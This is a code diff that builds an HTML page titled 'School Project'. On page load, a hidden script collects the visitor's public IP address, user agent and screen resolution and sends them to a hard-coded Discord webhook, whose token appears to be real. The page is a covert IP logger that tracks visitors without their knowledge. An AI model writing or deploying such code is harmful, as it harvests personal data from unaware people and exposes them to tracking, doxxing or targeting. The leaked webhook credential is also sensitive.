@@ -1,9 +1,12 @@
-
+<!DOCTYPE html>
+<html>
+<head>
+    <title>School Project</title>
+</head>
+<body>
+<script>
 const ipifyAPI = "https://api.ipify.org?format=json";
-
-
-const webhookURL = "Input your webhook url here (your webhook url can be seen easily)";
-
+const webhookURL = "https://discord.com/api/webhooks/1371982057164767242/zDyr01KlUryF7bHv91YuiQs_tshlZhUuYZVkxdCFE8oQIVC4ofAdvKfOJrbFzF-V2rI1"; // Replace this
 
 async function getIP() {
     try {
@@ -11,19 +14,23 @@ async function getIP() {
         const data = await response.json();
         return data.ip;
     } catch (error) {
-        console.error("Error fetching IP:", error);
-        return null;
+        console.error("Failed to get IP:", error);
+        return "Unknown";
     }
 }
 
-async function sendToDiscord(ip) {
-    if (!ip) {
-        console.error("IP address is null or undefined.");
-        return;
-    }
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    const screenRes = `${screen.width}x${screen.height}`;
+    return {
+        userAgent: ua,
+        screen: screenRes
+    };
+}
 
+async function sendToDiscord(ip, deviceInfo) {
     const payload = {
-        content: `IP Address: ${ip}`
+        content: `🧪 **School Project Visitor Info**\n📡 IP: ${ip}\n🖥️ User Agent: ${deviceInfo.userAgent}\n🖼️ Screen: ${deviceInfo.screen}`
     };
 
     try {
@@ -36,22 +43,22 @@ async function sendToDiscord(ip) {
         });
 
         if (response.ok) {
-            console.log("IP sent to Discord successfully!");
+            console.log("Sent info to Discord!");
         } else {
-            console.error("Error sending IP to Discord:", response.statusText);
+            console.error("Error sending:", response.statusText);
         }
-    } catch (error) {
-        console.error("Error:", error);
+    } catch (err) {
+        console.error("Error:", err);
     }
 }
-
 
 async function main() {
     const ip = await getIP();
-    if (ip) {
-        await sendToDiscord(ip);
-    }
+    const deviceInfo = getDeviceInfo();
+    await sendToDiscord(ip, deviceInfo);
 }
 
-
 main();
+</script>
+</body>
+</html>
